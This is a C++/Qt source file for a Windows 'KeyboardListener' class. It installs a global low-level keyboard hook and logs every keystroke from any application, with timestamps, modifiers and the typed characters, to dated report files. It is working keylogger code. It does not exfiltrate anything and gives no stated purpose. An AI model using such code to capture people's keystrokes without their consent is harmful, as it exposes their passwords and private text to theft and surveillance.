#include "keyboardlistener.h"

#include <QCoreApplication>
#include <QDateTime>
#include <QDir>

#include "virtualkeys.h"



QFile       KeyboardListener::mFile;
QTextStream KeyboardListener::mStream;



KeyboardListener::KeyboardListener()
{
    mKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, processKeyboardEvent, GetModuleHandle(NULL), 0);
}

KeyboardListener::~KeyboardListener()
{
    UnhookWindowsHookEx(mKeyboardHook);

    if (mFile.isOpen())
    {
        mFile.close();
    }
}

LRESULT CALLBACK KeyboardListener::processKeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        if (wParam == WM_KEYDOWN)
        {
            KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT*)lParam;

            if (
                pKeyboard->vkCode != VK_CAPITAL
                &&
                pKeyboard->vkCode != VK_LSHIFT
                &&
                pKeyboard->vkCode != VK_RSHIFT
                &&
                pKeyboard->vkCode != VK_SHIFT
                &&
                pKeyboard->vkCode != VK_LCONTROL
                &&
                pKeyboard->vkCode != VK_RCONTROL
                &&
                pKeyboard->vkCode != VK_CONTROL
                &&
                pKeyboard->vkCode != VK_LMENU
                &&
                pKeyboard->vkCode != VK_RMENU
                &&
                pKeyboard->vkCode != VK_MENU
               )
            {
                QString line = QDateTime::currentDateTime().toString("yyyy-MM-dd hh:mm:ss.zzz");
                line.append(" | ");



                static BYTE keyboardState[256];
                GetKeyboardState(keyboardState);

                keyboardState[VK_LSHIFT]   = 0x00;
                keyboardState[VK_RSHIFT]   = 0x00;
                keyboardState[VK_SHIFT]    = 0x00;
                keyboardState[VK_LCONTROL] = 0x00;
                keyboardState[VK_RCONTROL] = 0x00;
                keyboardState[VK_CONTROL]  = 0x00;
                keyboardState[VK_LMENU]    = 0x00;
                keyboardState[VK_RMENU]    = 0x00;
                keyboardState[VK_MENU]     = 0x00;

                QString keyName;

                if (GetKeyState(VK_CAPITAL) & 0x01)
                {
                    keyName.append("[CAPS LOCK] ");
                    keyboardState[VK_CAPITAL] = 0x01;
                }

                if (
                    GetKeyState(VK_LSHIFT) & 0x80
                    ||
                    GetKeyState(VK_RSHIFT) & 0x80
                    ||
                    GetKeyState(VK_SHIFT)  & 0x80
                   )
                {
                    keyName.append("Shift + ");
                    keyboardState[VK_SHIFT] = 0x80;
                }

                if (
                    GetKeyState(VK_LCONTROL) & 0x80
                    ||
                    GetKeyState(VK_RCONTROL) & 0x80
                    ||
                    GetKeyState(VK_CONTROL)  & 0x80
                   )
                {
                    keyName.append("Ctrl + ");
                    keyboardState[VK_CONTROL] = 0x80;
                }

                if (
                    GetKeyState(VK_LMENU) & 0x80
                    ||
                    GetKeyState(VK_RMENU) & 0x80
                    ||
                    GetKeyState(VK_MENU)  & 0x80
                   )
                {
                    keyName.append("Alt + ");
                    keyboardState[VK_MENU] = 0x80;
                }

                if (pKeyboard->vkCode == VK_RETURN)
                {
                    keyName.append("\\n");
                }
                else
                {
                    keyName.append(virtualKeyToString(pKeyboard->vkCode));

                    GUITHREADINFO gti;
                    ZeroMemory(&gti, sizeof(GUITHREADINFO));
                    gti.cbSize = sizeof(GUITHREADINFO);
                    GetGUIThreadInfo(0, &gti);

                    DWORD idThread = GetWindowThreadProcessId(gti.hwndActive,0);
                    HKL keyboardlayout = GetKeyboardLayout(idThread);

                    static WCHAR unicodeString[5];
                    int unicodeLength = ToUnicodeEx(pKeyboard->vkCode, pKeyboard->scanCode, keyboardState, unicodeString, 4, 0, keyboardlayout);

                    if (unicodeLength > 0)
                    {
                        unicodeString[4] = 0;

                        keyName = QString("%1 0x%2 | %3 | %4")
                                    .arg(pKeyboard->vkCode, -3)
                                    .arg(QString("%1").arg(pKeyboard->vkCode, 2, 16, QChar('0')).toUpper())
                                    .arg(keyName, -40)
                                    .arg(QString::fromWCharArray(unicodeString, unicodeLength));
                    }
                    else
                    {
                        keyName = QString("%1 0x%2 | %3")
                                    .arg(pKeyboard->vkCode, -3)
                                    .arg(QString("%1").arg(pKeyboard->vkCode, 2, 16, QChar('0')).toUpper())
                                    .arg(keyName);
                    }
                }



                line.append(keyName);

                // ---------------------------------------------------------------------------------------

                static QString fileName = "";

                if (fileName == "")
                {
                    QString dir = QCoreApplication::applicationDirPath();

                    QDir appDir;
                    appDir.mkpath(dir + "/Reports");

                    fileName = dir + "/Reports/" + QDate::currentDate().toString("yyyy-MM-dd") + ".rpt";

                    mFile.setFileName(fileName);
                    mFile.open(QIODevice::Append);

                    mStream.setCodec("UTF-8");
                    mStream.setGenerateByteOrderMark(true);
                    mStream.setDevice(&mFile);
                }

                mStream << line + "\n";
                mStream.flush();
            }
        }
    }

    return false;
}
